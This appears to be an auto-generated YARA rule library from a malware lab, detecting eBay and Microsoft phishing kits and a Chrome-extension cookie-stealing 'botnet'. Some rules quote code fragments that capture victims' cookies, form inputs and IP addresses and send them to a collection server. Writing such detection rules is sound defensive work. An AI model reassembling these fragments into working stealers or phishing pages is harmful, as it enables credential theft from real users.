      $x20 = "vjo.ctype('vjo.com.ebay.darwin.app.signin.EbayToolbar').needs(['vjo.dsf.Element','vjo.dsf.document.Form','vjo.dsf.client.Browser" ascii /* score: '33.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 500KB and
      1 of ($x*)
}

rule _opt_mal_phish__ebay_home_ubuntu_malware_lab_samples_extracted_phishing_Ebay_ip {
   meta:
      description = "phish__ebay - file ip.php"
      author = "Comps Team Malware Lab"
      reference = "phish__ebay phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d0f8f3e7985a87e0beb1699ccfadab7268ffc777c05fa1dfcc35a16b6d393947"
   strings:
      $s1 = "$useragent = \" User-Agent: \";" fullword ascii /* score: '17.00'*/
      $s2 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii /* score: '15.00'*/
      $s3 = "fwrite($fp, $useragent);" fullword ascii /* score: '12.00'*/
      $s4 = "elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))" fullword ascii /* score: '12.00'*/
      $s5 = "$file = 'ip.txt';" fullword ascii /* score: '11.00'*/
      $s6 = "      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'].\"\\r\\n\";" fullword ascii /* score: '10.00'*/
      $s7 = "fwrite($fp, $victim);" fullword ascii /* score: '9.00'*/
      $s8 = "$victim = \"IP: \";" fullword ascii /* score: '9.00'*/
      $s9 = "if (!empty($_SERVER['HTTP_CLIENT_IP']))" fullword ascii /* score: '7.00'*/
      $s10 = "fwrite($fp, $ipaddress);" fullword ascii /* score: '7.00'*/
      $s11 = "      $ipaddress = $_SERVER['HTTP_CLIENT_IP'].\"\\r\\n\";" fullword ascii /* score: '5.00'*/
      $s12 = "$fp = fopen($file, 'a');" fullword ascii /* score: '4.00'*/
      $s13 = "fwrite($fp, $browser);" fullword ascii /* score: '4.00'*/
      $s14 = "      $ipaddress = $_SERVER['REMOTE_ADDR'].\"\\r\\n\";" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}



/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/botnet_browser_chrome_master_/botnet_browser_chrome_master__auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-26
   Identifier: botnet_browser_chrome_master_
   Reference: botnet_browser_chrome_master_ auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule background {
   meta:
      description = "botnet_browser_chrome_master_ - file background.js"
      author = "Comps Team Malware Lab"
      reference = "botnet_browser_chrome_master_ auto gen"
      date = "2026-02-26"
      hash1 = "45479cfcb7703be222d35317bf7333d05514944c25baaac122ce1403205e6839"
   strings:
      $s1 = "chrome.runtime.onInstalled.addListener(function(details) {" fullword ascii /* score: '13.00'*/
      $s2 = "                console.log(domain);" fullword ascii /* score: '11.00'*/
      $s3 = "        console.log(tabId);" fullword ascii /* score: '11.00'*/
      $s4 = "                    fetch('http://localhost/server/api.php', {" fullword ascii /* score: '9.00'*/
      $s5 = "        browser.tabs.get(tabId, function (tab) {" fullword ascii /* score: '7.00'*/
      $s6 = "                browser.cookies.getAll({domain: domain}, function (cookies) {" fullword ascii /* score: '7.00'*/
      $s7 = "                }" fullword ascii /* reversed goodware string '}                ' */ /* score: '6.00'*/
      $s8 = "            }" fullword ascii /* reversed goodware string '}            ' */ /* score: '6.00'*/
      $s9 = "                        headers: { \"Content-Type\": \"application/json; charset=utf-8\" }," fullword ascii /* score: '5.00'*/
      $s10 = "    browser.webNavigation.onCompleted.addListener(function () {" fullword ascii /* score: '5.00'*/
      $s11 = "                        method: 'POST'," fullword ascii /* score: '4.00'*/
      $s12 = "// redirect after installation , change my url github to make paypal page" fullword ascii /* score: '4.00'*/
      $s13 = "  switch (details.reason) {" fullword ascii /* score: '4.00'*/
      $s14 = "      chrome.tabs.create({url: \"https://shoppy.gg/product/5d9ifM3\"});" fullword ascii /* score: '2.00'*/
      $s15 = "            Object.keys(obj).forEach(key => {" fullword ascii /* score: '2.00'*/
      $s16 = "                let domain = tab.url.includes(\"://\") ? tab.url.split(\"://\")[1].split(\"/\")[0] : tab.url.split(\"/\")[0];" fullword ascii /* score: '2.00'*/
      $s17 = "                        body: JSON.stringify({cookie : cookies})" fullword ascii /* score: '2.00'*/
      $s18 = "    browser.tabs.onActivated.addListener(function (tab) {" fullword ascii /* score: '2.00'*/
      $s19 = "                   //let str = unpack(cookies);" fullword ascii /* score: '2.00'*/
      $s20 = "(function() {" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
   condition:
      uint16(0) == 0x0a0d and filesize < 4KB and
      8 of them
}

rule _opt_mal_botnet_browser_chrome_master__home_ubuntu_malware_lab_samples_extracted_javascript_botnet_browser_chrome_master_server_assets_js_morris_morris {
   meta:
      description = "botnet_browser_chrome_master_ - file morris.js"
      author = "Comps Team Malware Lab"
      reference = "botnet_browser_chrome_master_ auto gen"
      date = "2026-02-26"
      hash1 = "561a3453fe6082ff3da7fcdf4eda7acd58a83c642a94306ed40f1cef6a745af7"
   strings:
      $s1 = "        return (_ref = this.hover).update.apply(_ref, this.hoverContentForRow(this.data.length - 1));" fullword ascii /* score: '16.00'*/
      $s2 = "        return \"\" + this.options.preUnits + (Morris.commas(label)) + this.options.postUnits;" fullword ascii /* score: '15.00'*/
      $s3 = "      return Math.min(this.data.length - 1, Math.floor((x - this.left) / (this.width / this.data.length)));" fullword ascii /* score: '14.00'*/
      $s4 = "      return new Date(parseInt(o[1], 10), parseInt(o[2], 10) - 1, parseInt(o[3], 10)).getTime();" fullword ascii /* score: '12.00'*/
      $s5 = "        return new Date(d.getFullYear() - d.getFullYear() % 10, 0, 1);" fullword ascii /* score: '12.00'*/
      $s6 = "      return new Date(parseInt(n[1], 10), parseInt(n[2], 10) - 1, 1).getTime();" fullword ascii /* score: '12.00'*/
      $s7 = "        return new Date(parseInt(q[1], 10), parseInt(q[2], 10) - 1, parseInt(q[3], 10), parseInt(q[4], 10), parseInt(q[5], 10))." ascii /* score: '12.00'*/
      $s8 = "        ret.setMonth(0, 1 + ((4 - ret.getDay()) + 7) % 7);" fullword ascii /* score: '12.00'*/
      $s9 = "      return new Date(parseInt(m[1], 10), parseInt(m[2], 10) * 3 - 1, 1).getTime();" fullword ascii /* score: '12.00'*/
      $s10 = "        return new Date(parseInt(r[1], 10), parseInt(r[2], 10) - 1, parseInt(r[3], 10), parseInt(r[4], 10), parseInt(r[5], 10), " ascii /* score: '12.00'*/
      $s11 = "      leftPadding = groupWidth * (1 - this.options.barSizeRatio) / 2;" fullword ascii /* score: '12.00'*/
      $s12 = "  Morris.commas = function(num) {" fullword ascii /* score: '11.00'*/
      $s13 = "leMargin >= labelBox.x) && labelBox.x >= 0 && (labelBox.x + labelBox.width) < this.el.width()) {" fullword ascii /* score: '11.00'*/
      $s14 = "      C = 1.9999 * Math.PI - min * this.data.length;" fullword ascii /* score: '11.00'*/
      $s15 = "leMargin >= labelBox.x) && labelBox.x >= 0 && (labelBox.x + labelBox.width) < _this.el.width()) {" fullword ascii /* score: '11.00'*/
      $s16 = "        row = this.data[this.data.length - 1 - i];" fullword ascii /* score: '11.00'*/
      $s17 = "      this.xmax = this.data[this.data.length - 1].x;" fullword ascii /* score: '11.00'*/
      $s18 = "      ymag = Math.floor(Math.log(span) / Math.log(10));" fullword ascii /* score: '11.00'*/
      $s19 = "        return this.displayHoverForRow(this.data.length - 1);" fullword ascii /* score: '11.00'*/
      $s20 = "        smag = Math.floor(Math.log(step) / Math.log(10));" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 200KB and
      8 of them
}

rule _opt_mal_botnet_browser_chrome_master__home_ubuntu_malware_lab_samples_extracted_javascript_botnet_browser_chrome_master_server_assets_js_custom {
   meta:
      description = "botnet_browser_chrome_master_ - file custom.js"
      author = "Comps Team Malware Lab"
      reference = "botnet_browser_chrome_master_ auto gen"
      date = "2026-02-26"
      hash1 = "5fe42242513c1293a68982e34db39b1d91e8188bf053c2e0dc0f6f53e5d49da4"
   strings:
      $s1 = "    Authour URI: www.binarycart.com" fullword ascii /* score: '12.00'*/
      $s2 = "                }" fullword ascii /* reversed goodware string '}                ' */ /* score: '6.00'*/
      $s3 = "        }" fullword ascii /* reversed goodware string '}        ' */ /* score: '6.00'*/
      $s4 = "    http://opensource.org/licenses/MIT" fullword ascii /* score: '5.00'*/
      $s5 = "                    label: \"Download Sales\"," fullword ascii /* score: '5.00'*/
      $s6 = "    100% To use For Personal And Commercial Use." fullword ascii /* score: '4.00'*/
      $s7 = "}(jQuery));" fullword ascii /* score: '4.00'*/
      $s8 = "                xkey: 'y'," fullword ascii /* score: '2.00'*/
      $s9 = "            Morris.Bar({" fullword ascii /* score: '2.00'*/
      $s10 = "            $(window).bind(\"load resize\", function () {" fullword ascii /* score: '2.00'*/
      $s11 = "    $(document).ready(function () {" fullword ascii /* score: '2.00'*/
      $s12 = "                xkey: 'period'," fullword ascii /* score: '2.00'*/
      $s13 = "    Version: 1.1" fullword ascii /* score: '2.00'*/
      $s14 = "                ykeys: ['a', 'b']," fullword ascii /* score: '2.00'*/
      $s15 = "                ykeys: ['iphone', 'ipad', 'itouch']," fullword ascii /* score: '2.00'*/
      $s16 = "/*=============================================================" fullword ascii /* score: '1.00'*/
      $s17 = "(function ($) {" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s18 = " ======================================*/" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 20KB and
      8 of them
}

rule _opt_mal_botnet_browser_chrome_master__home_ubuntu_malware_lab_samples_extracted_javascript_botnet_browser_chrome_master_extension_js_logger {
   meta:
      description = "botnet_browser_chrome_master_ - file logger.js"
      author = "Comps Team Malware Lab"
      reference = "botnet_browser_chrome_master_ auto gen"
      date = "2026-02-26"
      hash1 = "d50140fb61b4d0053693c659164475c868f65e09b1db5f66c5effcfc0927f0a7"
   strings:
      $s1 = "console.log(name+\"=\"+value);" fullword ascii /* score: '19.00'*/
      $s2 = "spyjs_getInput(e.currentTarget);" fullword ascii /* score: '19.00'*/
      $s3 = "console.log(currLoc);" fullword ascii /* score: '19.00'*/
      $s4 = "function spyjs_getInput(inputInfo){" fullword ascii /* score: '14.00'*/
      $s5 = "var url = \"http://127.0.0.1/server/\";  // change URL" fullword ascii /* score: '12.00'*/
      $s6 = "        pic.src = url+'log1.php?values='+name+\"=\"+value +  \"<br/>\"+ \"\"+currLoc+\"\"" fullword ascii /* score: '11.00'*/
      $s7 = "function spyjs_refreshEvents(){" fullword ascii /* score: '9.00'*/
      $s8 = "spyjs_refreshEvents();" fullword ascii /* score: '9.00'*/
      $s9 = "spyjs_saveData(\"(\"+currLoc+\")\");" fullword ascii /* score: '9.00'*/
      $s10 = "function spyjs_saveData(data){" fullword ascii /* score: '9.00'*/
      $s11 = "$('input').unbind('change');" fullword ascii /* score: '7.00'*/
      $s12 = "$('textarea').unbind('change');" fullword ascii /* score: '7.00'*/
      $s13 = "$('select').unbind('change');" fullword ascii /* score: '7.00'*/
      $s14 = "$('button').unbind('change');" fullword ascii /* score: '7.00'*/
      $s15 = "$('checkbox').unbind('change');" fullword ascii /* score: '7.00'*/
      $s16 = "$('textarea').change(function(e) {" fullword ascii /* score: '4.00'*/
      $s17 = "$('select').change(function(e) {" fullword ascii /* score: '4.00'*/
      $s18 = "var debug = 1;" fullword ascii /* score: '4.00'*/
      $s19 = "name=\"undefined_input\";" fullword ascii /* score: '4.00'*/
      $s20 = "if(value != \"\"){" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 3KB and
      8 of them
}



/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/phish__microsoft/phish__microsoft_auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-27
   Identifier: phish__microsoft
   Reference: phish__microsoft phishing_kit auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule boot_003 {
   meta:
      description = "phish__microsoft - file boot_003.js"
      author = "Comps Team Malware Lab"
      reference = "phish__microsoft phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "99ee02cff64167670249c49a2691dbe5e6e3ca2e55d9333f7bdadc48c325c35a"
   strings:
      $x1 = "(function(n,t){var i,g,tt,ut,it,u,l,d,a,nt,v,o,r,b,e,c,k,y,rt,w,f,h,p,s;i=function(n){return new i.prototype.init(n)},typeof req" ascii /* score: '88.00'*/
      $x2 = "]\",\"g\");_no.a.a=null;_no.a.d=\"ev.owa2\";_no.d.a=null;Type.registerNamespace(\"_a\");_a.cM=function(){};_a.cM.b=function(n){r" ascii /* score: '83.00'*/
      $x3 = "\"&&_a.J.d(s)&&e<6){e++;o=1;f=19;continue}if(u===\"]\"){f=23;continue}break;case 23:break;default:break}f=24}return f===23||f===" ascii /* score: '75.00'*/
      $x4 = "\",NativeDigits:[\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\"],DigitSubstitution:1},dateTimeFormat:{AMDesignator:" ascii /* score: '74.00'*/
      $x5 = "/* Empty file */;Function.__typeName=\"Function\";Function.__class=!0;Function.createCallback=function(n,t){return function(){va" ascii /* score: '64.00'*/
      $x6 = "();n._webRequest.completed(Sys.EventArgs.Empty);n._xmlHttpRequest=null}}};Sys.Net.XMLHttpExecutor.prototype={get_timedOut:functi" ascii /* score: '34.00'*/
      $x7 = "e.log(n);window.opera&&window.opera.postError(n);window.debugService&&window.debugService.trace(n)},_appendTrace:function(n){var" ascii /* score: '32.00'*/
      $s8 = "window.scriptsLoaded['boot.worldwide.0.mouse.js'] = 1; window.scriptProcessEnd = window.scriptProcessEnd || {}; window.scriptPro" ascii /* score: '30.00'*/
      $s9 = "!function(e){function n(){}function t(e,n){return function(){e.apply(n,arguments)}}function o(e){if(\"object\"!=typeof this)thro" ascii /* score: '30.00'*/
      $s10 = "window.scriptsLoaded = window.scriptsLoaded || {}; window.scriptProcessStart = window.scriptProcessStart || {}; window.scriptPro" ascii /* score: '30.00'*/
      $s11 = "tegoryDialog:171,calendarSurface:172,moveItemResponseProcessor:173,dumpster:174,globalization:175,moveItemServiceCommand:176,cal" ascii /* score: '29.00'*/
      $s12 = "very:43,dragDrop:44,emptyFolderResponseProcessor:45,errorHandler:46,extensibility:47,findConversationServiceCommand:48,findFolde" ascii /* score: '28.00'*/
      $s13 = "124,updateItemServiceCommand:125,updatePersonaResponseProcessor:126,updateUserConfigurationResponseProcessor:127,views:128,viewS" ascii /* score: '26.00'*/
      $s14 = "window.scriptsLoaded = window.scriptsLoaded || {}; window.scriptProcessStart = window.scriptProcessStart || {}; window.scriptPro" ascii /* score: '25.00'*/
      $s15 = "window.scriptsLoaded['boot.worldwide.0.mouse.js'] = 1; window.scriptProcessEnd = window.scriptProcessEnd || {}; window.scriptPro" ascii /* score: '25.00'*/
      $s16 = "ion=parseFloat(navigator.userAgent.match(/MSIE (\\d+\\.\\d+)/)[1]);Sys.Browser.version>=8&&document.documentMode>=7&&(Sys.Browse" ascii /* score: '25.00'*/
      $s17 = "* http://github.com/jquery/globalize" fullword ascii /* score: '25.00'*/
      $s18 = " {2}, {3}\",_a.d.r(n),r,_a.d.r(t),i)};_a.d.bY=function(n,t,i){var r;var u=new _j.q;r=n/31622400;r=Math.floor(r);if(r>=1){u.c(r.t" ascii /* score: '25.00'*/
      $s19 = "._getTokenRegExp(),e;!c&&a&&(e=a.fromGregorian(this));for(;;){var it=p.lastIndex,h=p.exec(n),d=n.slice(it,h?h.index:n.length);y+" ascii /* score: '24.00'*/
      $s20 = "ate._getTokenRegExp(),r;(r=h.exec(u))!==null;){var c=u.slice(f,r.index);f=h.lastIndex;s+=Date._appendPreOrPostMatch(c,i);if(s%2=" ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0xbbef and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule boot_004 {
   meta:
      description = "phish__microsoft - file boot_004.js"
      author = "Comps Team Malware Lab"
      reference = "phish__microsoft phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "86a18fd2596be2c32ff72e6cb77f2b2acf6bc6f8581cf55f73a28c4523c399cc"
   strings:
      $x1 = "_y.lt=function(){};_y.gJ=function(){};_y.gJ.registerInterface(\"_y.gJ\");_y.lu=function(){};_y.lv=function(){};_y.lv.registerInt" ascii /* score: '83.00'*/
      $s2 = "window.scriptsLoaded = window.scriptsLoaded || {}; window.scriptProcessStart = window.scriptProcessStart || {}; window.scriptPro" ascii /* score: '30.00'*/
      $s3 = "window.scriptsLoaded['boot.worldwide.2.mouse.js'] = 1; window.scriptProcessEnd = window.scriptProcessEnd || {}; window.scriptPro" ascii /* score: '30.00'*/
      $s4 = "||!this.gE&&t.e()>this.jl;n.bc()?this.qI(t.e()):this.qH(t.e());console.log(\"scm: HandleTouchMoveEventForSwipe -- stopping propa" ascii /* score: '27.00'*/
      $s5 = "window.scriptsLoaded = window.scriptsLoaded || {}; window.scriptProcessStart = window.scriptProcessStart || {}; window.scriptPro" ascii /* score: '25.00'*/
      $s6 = "window.scriptsLoaded['boot.worldwide.2.mouse.js'] = 1; window.scriptProcessEnd = window.scriptProcessEnd || {}; window.scriptPro" ascii /* score: '25.00'*/
      $s7 = "OwaUserConfiguration\")}}):f.h(t,u.b(n,i),u.a(n,r))})},invokeWithProcessResponse:function(n,t,i,r,u,f){var o=JsonParser.deserial" ascii /* score: '25.00'*/
      $s8 = "Rule:802,flightAndScriptVersion:850,manageMailboxQuota:860,manageAdGdprPreference:861,mail:1e3,automaticProcessing:1050,automati" ascii /* score: '21.00'*/
      $s9 = "tOwaUserConfig:function(n,t,i,r){},raiseResponseProcessorEvent:function(n,t){var r=JsonParser.deserialize(n);var i=JsonParser.de" ascii /* score: '21.00'*/
      $s10 = "n(n,t,i,r,u){var f=this;var h=function(n,i,r){var u=JsonParser.deserialize(n);_j.m.a().c(_a.a.y,\"PopOutProxyExecuteWithActionQu" ascii /* score: '21.00'*/
      $s11 = "nParser.deserialize(n);_j.m.a().c(_a.a.y,\"PopOutProxyInvokeWithProcessResponseCallbackFailure\",function(){u(t)})})})},jz:funct" ascii /* score: '21.00'*/
      $s12 = ".bH.Id!==\"ShellOfficeDotCom\"&&Array.add(t,n)}return t},h:function(){var n=new _h.dw;n.c(this.f);n.b(this.e);this.b=_a.b.b(_y.H" ascii /* score: '20.00'*/
      $s13 = "on.createDelegate(this,this.t);_a.c.b(n,\"getExplicitLogonAddress\");_a.c.b(t,\"featureManager\");_a.c.b(i,\"eventAggregator\");" ascii /* score: '20.00'*/
      $s14 = "AccessToken\":t.f(o,s,e.b(r,u),e.a(r,f));break;case\"ExecuteEwsProxy\":t.bu(o,s,e.b(r,u),e.a(r,f));break;case\"SaveExtensionSett" ascii /* score: '20.00'*/
      $s15 = "\"DropTargetTreeNodeData\")}return n},j:function(n){if(n!==this.n){this.n=n;this.by(\"ActivateTreeNodeSelectionCommand\")}return" ascii /* score: '19.00'*/
      $s16 = " ViewModel of type {0} has no associated view or template\",Object.getType(n).getName());throw Error.argument(\"Specified ViewMo" ascii /* score: '19.00'*/
      $s17 = "er.serialize(i);var o=this;_a.Y.a(this.jC,function(t){t.invokeWithProcessResponse(n,e,f,window.self,function(n){var t=JsonParser" ascii /* score: '19.00'*/
      $s18 = "serialize(t);var u=this;_j.m.a().c(_a.a.y,\"PopOutRaiseResponseProcessorEvent\",function(){_y.bE.e(r,i)})},raiseResponseComplete" ascii /* score: '18.00'*/
      $s19 = ".z,!1)-_j.k.l(n.z,!1)/2;break;default:throw Error.invalidOperation(\"NotchPeek doesnt support the aligment type passed as parame" ascii /* score: '18.00'*/
      $s20 = ":0,genericError:1,fileReadError:2,sizeExceeded:3,imageTypeNotSupported:4,groupsDocumentUrlNotFound:5,groupSharePointNotProvision" ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0xbbef and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule boot_002 {
   meta:
      description = "phish__microsoft - file boot_002.js"
      author = "Comps Team Malware Lab"
      reference = "phish__microsoft phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5746b5b2319fb40cc9613656f0c809520039efbf58b6eff58956c55e884fd231"
   strings:
      $x1 = ";_n.a.jT=function(n){return n.ea()};_n.a.kb=function(n){return n.ej()};_n.a.hM=function(n){return 300};_n.a.fh=function(n){retur" ascii /* score: '78.00'*/
      $x2 = "365.Log.b(\"Theme_CssLoadFailed\",6,n)},!1);document.getElementsByTagName(\"head\")[0].appendChild(t)}else{O365.Log.WriteShellLo" ascii /* score: '32.00'*/
      $x3 = "this.s.LogLevelSwitches)throw Error.invalidOperation();this.H=!0;var n=new _o365cl.b;n.LogProcessorOverride=this.C.LogProcessorO" ascii /* score: '32.00'*/
      $s4 = "window.scriptsLoaded['boot.worldwide.3.mouse.js'] = 1; window.scriptProcessEnd = window.scriptProcessEnd || {}; window.scriptPro" ascii /* score: '30.00'*/
      $s5 = "window.scriptsLoaded = window.scriptsLoaded || {}; window.scriptProcessStart = window.scriptProcessStart || {}; window.scriptPro" ascii /* score: '30.00'*/
      $s6 = "PointOnline\",\"PowerPoint\",\"https://office.live.com/start/PowerPoint.aspx?auth=1\",\"_blank\",null));Array.add(t,_sc2.a.a(\"S" ascii /* score: '30.00'*/
      $s7 = ".t.c,this.t.b,this.t.d);O365.Log.b(\"CommonShellSettings_InvalidShellDataOperation\",6,String.format(\"IsInShimMode:{0}, IsRTLSp" ascii /* score: '29.00'*/
      $s8 = "r;try{var c=new O365.ShellAriaLogger.LogConfiguration;c.disableCookies=!0;O365.ShellAriaLogger.LogManager.initialize(this.h,c);t" ascii /* score: '29.00'*/
      $s9 = "rray.add(t,_sc2.a.a(\"ShellWordOnline\",\"Word\",\"https://office.live.com/start/Word.aspx?auth=1\",\"_blank\",null));Array.add(" ascii /* score: '28.00'*/
      $s10 = "\"ShellSkype\",\"Skype\",\"https://web.skype.com/?source=owa\",\"_blank\",null));Array.add(t,_sc2.a.a(\"ShellOffice\",\"Office\"" ascii /* score: '27.00'*/
      $s11 = "365.Log.f){O365.Log.o=!0;var r=document.createElement(\"script\");r.src=n;r.crossOrigin=\"anonymous\";O365.Log.WriteShellLog(500" ascii /* score: '27.00'*/
      $s12 = "O365.Log.s(t.s.AriaTelemetryTenantToken,\"G2Shell\",n,t.u,null)},null)},J:function(){if(!this.H){if(!_o365su.g.b(this.s.LogUrl)|" ascii /* score: '27.00'*/
      $s13 = "n){var t;_o365su.b.ThrowOnNullOrUndefined(n,\"configuration\");this.b=n;if(n.LogSenderOverride)t=n.LogSenderOverride;else if(n.L" ascii /* score: '27.00'*/
      $s14 = ".e,i);O365.Log.a(\"UserPhoto_BeginGetUserPhotoUrl_Failed\",6,i,this.e)}},r:function(n){if(n){if(!_o365sg2c.h.a){_o365sg2c.h.a=!0" ascii /* score: '27.00'*/
      $s15 = "xAdditionalParametersLength:440,MaxMessagesPerPayload:10,MaxPayloadSize:2048,MaxSingleArgumentLength:1024};O365.Logger=function(" ascii /* score: '27.00'*/
      $s16 = "ne\",\"NavLink\",null,null,1,1)}window.open(\"https://profile.live.com\",_ho2.b.b)},cP:function(){if(this.s===2){O365.Log.WriteS" ascii /* score: '27.00'*/
      $s17 = ".Log.get_DefaultLogSwitches());O365.Log.j=new O365.Logger(n);O365.Log.j.c(405003,6,1,!1,0,null)}};_o365cl.b=function(){};_o365cl" ascii /* score: '26.00'*/
      $s18 = "AriaTelemetryEnabled&&!_j.h.a(this.s.ShellAriaLoggerJS)){O365.Log.r();var n=this;this.y.b(\"SuiteAPILoaded\",function(){n.o(null" ascii /* score: '26.00'*/
      $s19 = "65.Log.c(i.D().b().HelpLink.Id,\"HelpPane\",\"NavLink\",null,null,1,1);window.open(i.D().b().HelpLink.Url,i.D().b().HelpLink.Tar" ascii /* score: '26.00'*/
      $s20 = "eturn n},x:null,p:function(n){this.x.c(n)},o:function(n){var t=this;O365.Log.t(this.s.ShellAriaLoggerJS,function(){O365.Log.e(\"" ascii /* score: '26.00'*/
   condition:
      uint16(0) == 0xbbef and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__microsoft_home_ubuntu_malware_lab_samples_extracted_phishing_Microsoft_index_files_prefetch_data_boot {
   meta:
      description = "phish__microsoft - file boot.js"
      author = "Comps Team Malware Lab"
      reference = "phish__microsoft phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "e230cf01ca2fd3a19eb9f43f6dc35fd2a92fc2dccc96d8b92891fe8eb5bd80db"
   strings:
      $x1 = ";_a.d.G=function(n,t){this.b=n;this.a=t};_a.d.G.prototype={b:0,a:0};_a.fo=function(n){this.s=n};_a.fo.prototype={s:null,t:null,i" ascii /* score: '88.00'*/
      $x2 = "'\"};_a.F.w={hi:!0,th:!0,ar:!0,gu:!0,fa:!0,he:!0,hi:!0,ja:!0,kn:!0,ko:!0,ml:!0,mr:!0,or:!0,ur:!0,ta:!0,te:!0,vi:!0,zh:!0,\"zh-ha" ascii /* score: '80.00'*/
      $x3 = "[0].cP))&&(i.RemoteExecute=!0);var r=null;var e,f;(f=_h.u.b(t.explicitLogonUser,this.e,_g.a.a().c(),e={val:r}),r=e.val,f)&&(t.an" ascii /* score: '32.00'*/
      $s4 = "window.scriptsLoaded['boot.worldwide.1.mouse.js'] = 1; window.scriptProcessEnd = window.scriptProcessEnd || {}; window.scriptPro" ascii /* score: '30.00'*/
      $s5 = "window.scriptsLoaded = window.scriptsLoaded || {}; window.scriptProcessStart = window.scriptProcessStart || {}; window.scriptPro" ascii /* score: '30.00'*/
      $s6 = "darFeeds\")},ga:function(){return this.a(_a.i,\"OwaXRFRemoteExecute\")},jZ:function(){return this.a(_a.i,\"ModernGroupsUserSessi" ascii /* score: '29.00'*/
      $s7 = "ecuteRequest()},this.j)}else this.executeRequest()}else this.k()},k:function(){this.get_webRequest().completed(Sys.EventArgs.Emp" ascii /* score: '29.00'*/
      $s8 = "QABAIAAAAAAAP///yH5BAEAAAEALAAAAAABAAEAAAIBTAA7\";t.InlineImageUrlOnLoadTemplate=\"InlineImageLoader.GetLoader().Load(this)\";t." ascii /* score: '28.00'*/
      $s9 = "t||n.lastAttempt};_g.H.c=function(n,t){var i=_a.d.get_utcNow().e(t);n.processingTime=(n.processingTime||0)+i};_g.H.a=function(n)" ascii /* score: '27.00'*/
      $s10 = "ction(n,t,i,r){this.jA(0,\"ExecuteSearch\",n,t,i,r)},eD:function(n,t,i,r){this.jA(0,\"FetchOwaUserSessions\",{filterOnCurrentSes" ascii /* score: '26.00'*/
      $s11 = "window.scriptsLoaded = window.scriptsLoaded || {}; window.scriptProcessStart = window.scriptProcessStart || {}; window.scriptPro" ascii /* score: '25.00'*/
      $s12 = "NoError\",timeoutCount:0,abandonedCount:0,firstAttempt:null,lastAttempt:null,processingTime:0,correlationId:null,activityId:null" ascii /* score: '25.00'*/
      $s13 = "window.scriptsLoaded['boot.worldwide.1.mouse.js'] = 1; window.scriptProcessEnd = window.scriptProcessEnd || {}; window.scriptPro" ascii /* score: '25.00'*/
      $s14 = "a=!0:v=!0)}if(a||!r.e&&v)throw Error.invalidOperation(\"Multiple templates found for ViewModel \"+Object.getType(n).getName()+'." ascii /* score: '24.00'*/
      $s15 = "yload.getMailFolderItem},k:function(n){PageDataPayload.getMailFolderItem=n;return n},h:function(){return PageDataPayload.owaUser" ascii /* score: '24.00'*/
      $s16 = ")},eB:function(n,t,i,r){this.jA(0,\"EndSearchSession\",n,t,i,r)},bu:function(n,t,i,r){this.jA(0,\"ExecuteEwsProxy\",n,t,i,r)},eC" ascii /* score: '24.00'*/
      $s17 = "ResponseMessageSuccess\":n===\"Error\"&&(r=\"CreateItemResponseMessageFailure\");if(r){var u=_h.CreateItemResponseProcessor.a.ge" ascii /* score: '23.00'*/
      $s18 = " p={key:a,value:w[a]};r.get_headers()[p.key]=p.value}}}var y=!0;u&&(y=!u.preventRetry);_g.H.d(n)&&y&&r.set_executor(new _g.gP(_j" ascii /* score: '23.00'*/
      $s19 = "Error.invalidOperation(\"SyncInlineAttachmentRequestManager is already executing sync request\");this.a().open(this.i,_a.fb.a+th" ascii /* score: '23.00'*/
      $s20 = ".Q.i,\"Processing response from {0} failed: {1}\",n.request.methodName,t.message)})},jU:function(n,t){var i=this.kc.getHandler(n" ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0xbbef and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__microsoft_home_ubuntu_malware_lab_samples_extracted_phishing_Microsoft_index_files_prefetch_data_boot_2 {
   meta:
      description = "phish__microsoft - file boot.css"
      author = "Comps Team Malware Lab"
      reference = "phish__microsoft phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "cd2ddb8b2f8ab2461222b1cb56431e615cdcf0d1f8491c31a4291a38d41f1229"
   strings:
      $x1 = ".feedbackList{-webkit-animation-duration:.17s;-moz-animation-duration:.17s;animation-duration:.17s;-webkit-animation-name:feedba" ascii /* score: '71.00'*/
      $s2 = "wLmlpZDpCQUVGMjQ0MkNFQTAxMUUwODVFRkVGMkEyMDYzQjNCOSIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiPiA8eG1wTU06RGV" ascii /* base64 encoded string '.iid:BAEF2442CEA011E085EFEF2A2063B3B9" xmp:CreatorTool="Adobe Photoshop CS5 Windows"> <xmpMM:De' */ /* score: '24.00'*/
